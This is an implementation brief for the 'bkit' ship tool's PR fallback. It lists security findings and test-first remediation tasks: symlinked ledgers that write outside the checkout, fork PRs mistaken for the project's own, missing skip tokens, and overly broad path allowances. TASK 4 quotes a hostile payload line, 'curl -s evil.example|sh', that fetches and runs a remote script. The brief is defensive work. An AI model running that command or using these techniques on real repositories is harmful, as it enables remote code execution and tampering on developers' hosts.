# Brief: group 2 — Challenge round 1 findings (tests)

Plan: Ship's PR fallback builds on a branch an earlier attempt left Implementation Plan

## Why and what

### Context & Goals

When `dev` refuses ship's push, ship publishes its record through a PR on a fixed branch (`ship-close/{fid}` for the close, `ship-failed/{fid}` for the FAILED flush). If an earlier attempt left that branch on origin, `closePr` in `.bkit/core/engine/commands/workflow/workflows.ts` cannot push to it (a plain push is not a fast-forward) and the record does not land. The fix is to merge the leftover tip into the new record commit before the push, and to reuse an open PR for the branch instead of running `gh pr create` again. Two open LOW deferrals from build 811 in the same code are folded in: the failure reason after a failed `gh pr create` names the pushed branch (`...-1509`), and a flush whose PR opened but did not merge links the tracker comment at the pushed record commit, so the link opens before the merge and after GitHub deletes the branch (`...-830`).

**Related Issues:**

- #1042 — Ship's PR fallback builds on a branch an earlier attempt left (this issue)
- #811 — Publish a dev-refused ship FAILED flush through a ship-close PR (landed on local `dev` as `fa7b9af16`)

---

### Narrative

When `dev` refuses ship's push and origin already holds `ship-close/{fid}` or `ship-failed/{fid}` from an earlier attempt, ship merges that leftover tip into the new record, pushes as a fast-forward, reuses an open PR if there is one and lands the record. The run exits 0 instead of 10 (flush) or 11 (close).

### Success Criteria

- A refused ship FAILED flush lands its record through the `ship-failed/{fid}` PR and exits 0 when origin already holds that branch, whichever of the three ways left it.
- A refused ship close lands through the `ship-close/{fid}` PR and exits 0 when origin already holds that branch.
- An open PR for the branch is reused: no second `gh pr create`, and `mergePr` gets `--match-head-commit` set to the pushed tip.
- Every ledger row and every log file name the leftover tip held is still on the branch after the push.
- A leftover tip that changes a file outside the min-push paths is not merged: the branch on origin is unchanged, the failure reason names the branch and the outside paths, and the exit code is the same as for any other PR-path failure today (10 for the flush, 11 for the close).

### Out of Scope

<!-- prettier-ignore -->
| Excluded item | Why `Exempt` | Where it belongs |
| --- | --- | --- |
| Deleting leftover branches, or pruning old ones | (a) needs no deletion; it only adds to the goal | A follow-up if branches pile up |
| Whether a bkit-owned PR branch counts as a personal branch under `.agents/rules.md` § Force push | (a) uses neither force push nor delete | An owner decision on the rule |
| Pre-flighting the `dev` review and status-check rules that make a close PR's merge fail | A separate check; it only adds to the goal | `docs/deployments.md` § Autonomous phase-close prerequisites |

## Where it fits

- Group 1: Publish onto a branch an earlier attempt left — done
  - TASK 1: Merge a leftover branch tip into the record and reuse its open PR — done
  - TASK 2: Link an unmerged flush's handover comment at the pushed commit — done
  - TASK 3: Say that ship's PR fallback builds on a branch an earlier attempt left — done
- Group 2: Challenge round 1 findings — this group
  - TASK 4: Anyone who can push `ship-failed/{FID}` plants a symlinked `.jsonl` in the run's log folder, and the refused flush's `restoreBranchRows` follows it, creating a file outside the checkout at a path and with lines the attacker chose (a `.pth` or `profile.d` file runs code on the ship host) — open
  - TASK 5: An outsider opens a fork PR whose head branch is named `ship-failed/{FID}`; the refused flush takes it as the leftover branch's open PR, creates no PR of its own, and logs "close PR #N opened but not merged — merge it by hand", pointing the operator at the attacker's PR — open
  - TASK 6: A second refused flush pushes a `Merge commit '<sha>'` head with no `[skip ci]`, so the reused `ship-failed/{FID}` PR runs the full CI on every later attempt — open
  - TASK 7: A reused open PR is merged with `--match-head-commit` straight after the branch push, before GitHub has moved the PR's head to the pushed tip, so GitHub refuses the merge and the record waits for a human — open
  - TASK 8: Anyone who can push `ship-failed/{FID}` or `ship-close/{FID}` gets a new skill (`.claude/skills/x/SKILL.md` plus scripts), a `skills-lock.json` source, a `docs/*.md` rule or a `.bkit/issues.jsonl` `SHIPPED` row onto `dev`, inside bkit's own `[skip ci]` record commit, because the leftover-tip check allows every min-push path instead of the paths a record holds — open
- Group 3: Challenge round 1 findings — next
  - TASK 9: A leftover tip carrying content the landing gate would reject (a malformed ledger row, a home-directory path, or a secret a consumer's `bkit:gate:min` scans for) reaches `dev` unchecked: `checkLanding` gated only the record, the merge commit is pushed without a gate, and the `[skip ci]` squash subject means no CI runs after it either — open

## The work

<!-- bkit:task 4 start -->
- [ ] **TASK 4:** Anyone who can push `ship-failed/{FID}` plants a symlinked `.jsonl` in the run's log folder, and the refused flush's `restoreBranchRows` follows it, creating a file outside the checkout at a path and with lines the attacker chose (a `.pth` or `profile.d` file runs code on the ship host)
  **Severity:** CRITICAL · **Class:** mechanical · **Fixable:** true · **Location:** `.bkit/core/engine/commands/workflow/workflows.ts:1711` · **Round:** 1
  - **DONE WHEN:** `closePr` refuses a leftover tip whose `mergeBase..tip` diff adds or changes any entry that is not a regular file (mode `120000` symlink or `160000` gitlink): nothing is merged or pushed, the failure names the branch and the paths, and the exit code is 10 for the flush and 11 for the close. `restoreBranchRows` also never writes through a symlink: it `lstat`s each target, skips anything that is not a regular file, and checks that the resolved path stays inside `dir`, as `prepareLandInputs` in `.bkit/core/engine/commands/land.ts` does. Verified in this challenge: the real `dist/` `minPushOutside` returns `outside: []` for `docs/plans/m/logs/f/evil.jsonl` as a symlink, `git merge --no-commit -X ours` checks it out, and the real `restoreBranchRows` created `{outside}/x<newline>curl -s evil.example|sh` with that payload line as its content.
  - **TEST FIRST:**
    - `.bkit/core/engine/commands/workflow/workflows.test.ts` `--flush refused by dev does not merge a leftover tip that adds a symlinked ledger` fails on the flush exiting 0 and the file at the symlink's target outside the repo existing (the leftover tip adds `${REL}/evil.jsonl` as a symlink to `{tmp outside dir}/planted`; it expects exit 10, a log naming `ship-failed/{FID}` and `evil.jsonl`, the remote branch still at the leftover tip, and no `{tmp outside dir}/planted`)
    - `.bkit/core/engine/commands/workflow/branches.test.ts` `restoreBranchRows writes nothing through a symlinked ledger` fails on `restoreBranchRows` creating the symlink's target (a repo with a `-X ours` merge open whose tip adds a `.jsonl` symlink to a missing file in a temp dir; it expects that file to stay absent after the call)
<!-- bkit:task 4 end -->

<!-- bkit:task 5 start -->
- [ ] **TASK 5:** An outsider opens a fork PR whose head branch is named `ship-failed/{FID}`; the refused flush takes it as the leftover branch's open PR, creates no PR of its own, and logs "close PR #N opened but not merged — merge it by hand", pointing the operator at the attacker's PR
  **Severity:** HIGH · **Class:** mechanical · **Fixable:** true · **Location:** `.bkit/core/engine/commands/workflow/workflows.ts:1722` · **Round:** 1
  - **DONE WHEN:** `closePr` reuses an open PR only when it comes from this repository (`isCrossRepository` false, read through `PR_FIELDS` in `.bkit/core/engine/commands/workflow/prs.ts`) and its `headRefName` is `branch`. When the only open PRs listed are fork PRs, `closePr` runs `gh pr create` and merges its own PR. `gh pr list --head` matches by branch name alone, so fork PRs with the same name are listed too. `probePr` picks `prs[0]` with no repository check, which breaks the rule in `docs/security.md` § CI Auto-Route Trust (bkit-cloud) that fork PRs are not collaborator-trusted and are filtered out before use.
  - **TEST FIRST:**
    - `.bkit/core/engine/commands/workflow/workflows.test.ts` `--flush refused by dev with a fork PR on the ship-failed branch name opens its own PR` fails on `pr create` never running (a leftover `ship-failed/{FID}` tip sits on origin, and the `ghStub` `pr list` answers PR 7 with `"isCrossRepository":true` and a `headRefOid` that is not the tip until `pr create` runs; it expects one `pr create --head ship-failed/{FID}` call and no `pr merge 7` call)
<!-- bkit:task 5 end -->

<!-- bkit:task 6 start -->
- [ ] **TASK 6:** A second refused flush pushes a `Merge commit '<sha>'` head with no `[skip ci]`, so the reused `ship-failed/{FID}` PR runs the full CI on every later attempt
  **Severity:** MEDIUM · **Class:** mechanical · **Fixable:** true · **Location:** `.bkit/core/engine/commands/workflow/workflows.ts:1712` · **Round:** 1
  - **DONE WHEN:** The merge commit `closePr` makes over a leftover tip carries the record's `subject` (`chore({FID}): {workflow} FAILED bkit [skip ci]` / `docs({FID}): ship DONE bkit [skip ci]`) as its message, so the pushed branch head keeps the skip token exactly as a first attempt's record commit does, and GitHub starts no `pull_request` run for the PR (`docs/knowledge.jsonl` key `kn-11-pr-statuscheckrollup-stays-empty-when-skip-ci-is-head`; `.bkit/templates/.github/workflows/bkit-ci.yml` runs on `pull_request` to `dev`).
  - **TEST FIRST:**
    - `.bkit/core/engine/commands/workflow/workflows.test.ts` `--flush refused by dev onto a leftover ship-failed branch keeps the skip token on the pushed head` fails on `git log -1 --format=%s ship-failed/{FID}` on the remote reading `Merge commit '<sha>'` with no `[skip ci]` (`git commit --no-edit` writes git's default merge subject; a scratch repo run of the same `merge --no-ff --no-commit -X ours` + `commit --no-edit` printed `Merge commit '203d597c...' into dev`)
<!-- bkit:task 6 end -->

<!-- bkit:task 7 start -->
- [ ] **TASK 7:** A reused open PR is merged with `--match-head-commit` straight after the branch push, before GitHub has moved the PR's head to the pushed tip, so GitHub refuses the merge and the record waits for a human
  **Severity:** MEDIUM · **Class:** mechanical · **Fixable:** true · **Location:** `.bkit/core/engine/commands/workflow/workflows.ts:1747` · **Round:** 1
  - **DONE WHEN:** On the reuse path (`open` found an open PR), `closePr` re-reads the PR (`probePr` by number, `headRefOid` is in `PR_FIELDS`) within a bounded wait until `headRefOid` equals the pushed `head`, and only then calls `mergePr`; a head that never arrives within the bound still ends as `close-pr-open`, as today. The create path is unchanged, because `gh pr create` runs after the push and GitHub reads the head then.
  - **TEST FIRST:**
    - `.bkit/core/engine/commands/workflow/workflows.test.ts` `a second refused close waits for the reused PR head to reach the pushed tip before merging` fails on the close ending with `landed.via` `close-pr-open` (gh stub: `pr list` / `pr view` answer the leftover tip as `headRefOid` on the first read and the pushed tip after, and `pr merge --match-head-commit {sha}` exits 1 with `Head branch was modified` until a read has answered `{sha}`; it expects `landed` `{ ref: ship-close/{FID}, via: close-pr }` and one successful `pr merge`)
<!-- bkit:task 7 end -->

<!-- bkit:task 8 start -->
- [ ] **TASK 8:** Anyone who can push `ship-failed/{FID}` or `ship-close/{FID}` gets a new skill (`.claude/skills/x/SKILL.md` plus scripts), a `skills-lock.json` source, a `docs/*.md` rule or a `.bkit/issues.jsonl` `SHIPPED` row onto `dev`, inside bkit's own `[skip ci]` record commit, because the leftover-tip check allows every min-push path instead of the paths a record holds
  **Severity:** MEDIUM · **Class:** mechanical · **Fixable:** true · **Location:** `.bkit/core/engine/commands/workflow/workflows.ts:1700` · **Round:** 1
  - **DONE WHEN:** `closePr` checks a leftover tip against the record's own paths: the run's log folder `docs/plans/*/logs/{FID}/*` and the ledger globs in `UNION_PATHSPECS` (`.bkit/core/engine/commands/workflow/ledgers.ts`), including its `:(exclude).bkit/issues.jsonl`. It does not use `minPushPathspecs`, whose `bookPathspecs(..., "pr")` entries `.claude/skills/*`, `.agents/skills/*`, `.cursor/skills/*`, `.opencode/skills/*`, `skills-lock.json`, `:(glob)docs/*.md`, `docs/roadmap.md` and `docs/audits/**` cover no file a ship record writes. A tip that touches any other path is refused, its failure names the branch and the paths, and the exit code is 10 or 11. A plain pathspec `*` crosses `/`, as the `bookPathspecs` doc comment and gitglossary say, so `.claude/skills/*` admits any file under a new skill folder. `.bkit/core/.bkit/workflows.md` states that a union never carries `.bkit/issues.jsonl` onto `dev`, and `docs/security.md` § Supply-Chain (GitHub Actions) accepts the unscanned `[skip ci]` risk for audit reports only.
  - **TEST FIRST:**
    - `.bkit/core/engine/commands/workflow/workflows.test.ts` `--flush refused by dev does not merge a leftover tip that adds a skill` fails on the flush exiting 0 with the skill on the branch (the leftover tip adds `.claude/skills/probe/SKILL.md`; it expects exit 10, a log naming `ship-failed/{FID}` and `.claude/skills/probe/SKILL.md`, and the remote branch still at the leftover tip)
    - `.bkit/core/engine/commands/workflow/workflows.test.ts` `--flush refused by dev does not merge a leftover tip that writes .bkit/issues.jsonl` fails on the flush exiting 0 with the `SHIPPED` row on the branch (the leftover tip adds a `SHIPPED` row to `.bkit/issues.jsonl`; it expects exit 10 and `git show ship-failed/{FID}:.bkit/issues.jsonl` on the remote to lack that row)
<!-- bkit:task 8 end -->

### Derived Test Matrix rows

<!-- prettier-ignore -->
| Test description | Type | Target file | Task |
| --- | --- | --- | --- |
| --flush refused by dev twice for one FID publishes the second record through a PR | Unit (boundary: real temp git repos + bare remote) | `.bkit/core/engine/commands/workflow/workflows.test.ts` | 1 |
| --flush refused by dev with ship-failed left on origin and no PR opens one PR on that branch | Unit (boundary: real temp git repos + bare remote) | `.bkit/core/engine/commands/workflow/workflows.test.ts` | 1 |
| --flush refused by dev with a squash-merged ship-failed tip left on origin lands the new record | Unit (boundary: real temp git repos + bare remote) | `.bkit/core/engine/commands/workflow/workflows.test.ts` | 1 |
| --flush refused by dev does not merge a leftover tip that changes code | Unit (boundary: real temp git repos + bare remote) | `.bkit/core/engine/commands/workflow/workflows.test.ts` | 1 |
| a second refused close for one FID reuses the open ship-close PR | Unit (boundary: real temp git repos + bare remote) | `.bkit/core/engine/commands/workflow/workflows.test.ts` | 1 |
| --flush refused by dev with gh pr create failing names the pushed ship-failed branch | Unit (boundary: real temp git repos + bare remote) | `.bkit/core/engine/commands/workflow/workflows.test.ts` | 1 |
| --flush refused by dev links the handover comment at the pushed commit when the PR did not merge | Unit (boundary: real temp git repos + bare remote) | `.bkit/core/engine/commands/workflow/workflows.test.ts` | 2 |
| --flush refused by dev keeps the unmerged handover link readable after the branch is deleted | Unit (boundary: real temp git repos + bare remote) | `.bkit/core/engine/commands/workflow/workflows.test.ts` | 2 |
| --flush refused by dev does not merge a leftover tip that adds a symlinked ledger | Unit | `.bkit/core/engine/commands/workflow/workflows.test.ts` | 4 |
| restoreBranchRows writes nothing through a symlinked ledger | Unit | `.bkit/core/engine/commands/workflow/branches.test.ts` | 4 |
| --flush refused by dev with a fork PR on the ship-failed branch name opens its own PR | Unit | `.bkit/core/engine/commands/workflow/workflows.test.ts` | 5 |
| --flush refused by dev onto a leftover ship-failed branch keeps the skip token on the pushed head | Unit | `.bkit/core/engine/commands/workflow/workflows.test.ts` | 6 |
| a second refused close waits for the reused PR head to reach the pushed tip before merging | Unit | `.bkit/core/engine/commands/workflow/workflows.test.ts` | 7 |
| --flush refused by dev does not merge a leftover tip that adds a skill | Unit | `.bkit/core/engine/commands/workflow/workflows.test.ts` | 8 |
| --flush refused by dev does not merge a leftover tip that writes .bkit/issues.jsonl | Unit | `.bkit/core/engine/commands/workflow/workflows.test.ts` | 8 |
| --flush refused by dev runs the landing gate on a merged leftover tip | Unit | `.bkit/core/engine/commands/workflow/workflows.test.ts` | 9 |

## Deviations

- What to build is decided in the issue: candidate (a), merge the leftover branch tip into the new record and reuse an open PR. No force push, no branch deletion, no new branch name. Do not build candidates (b) or (c).
- Every line number in the issue is stale: the builds of issues 811 and 958 both changed `.bkit/core/engine/commands/workflow/workflows.ts` since it was written. Find each place by its name (`closePr`, `shipClose`, `landFailedRecord`, `restoreBranchRows`, `pushToDev`, `probePr`, `mergePr`, `minPushOutside`, `minPushPathspecs`).
- Every test runs against temporary git repositories and a bare remote on this machine, with `gh` stubbed, as the existing tests in `workflows.test.ts` do. No test and no step of yours pushes to, or opens a pull request on, the real `origin`.
- Files you may change: `.bkit/core/engine/commands/workflow/workflows.ts`, `workflows.test.ts`, `branches.ts`, `branches.test.ts`, `prs.ts` and `prs.test.ts` only if the PR reuse needs it, the doc lines the issue's TASK 2 lists (`.bkit/core/.bkit/workflows.md` source, `docs/deployments.md`, `docs/testing.md`), the ledger rows the issue names, the built `dist/`, and the rendered copies that `pnpm tsx .bkit/core/engine/cli.ts upgrade` rewrites.
- Files you must not change: `.bkit/core/engine/commands/workflow/steps.ts`, `tests.ts`, `tasks.ts`, `summary.ts` and their tests (the build of issue 1051 and two helpers work on them now); `.bkit/core/engine/commands/land.ts` and `.bkit/core/engine/commands/ci/ci.ts` (read only, as the plan says); `.bkit/instructions.md`; every workflow and prompt file; `.husky/*`; `.github/workflows/*`. If the fix cannot be done without one of these, stop and say what you found.
- Word counts: no workflow or prompt text changes, so `pnpm bkit:text:ceiling check` must still pass at prompts 83,837 and workflows 57,977. Never `raise`.
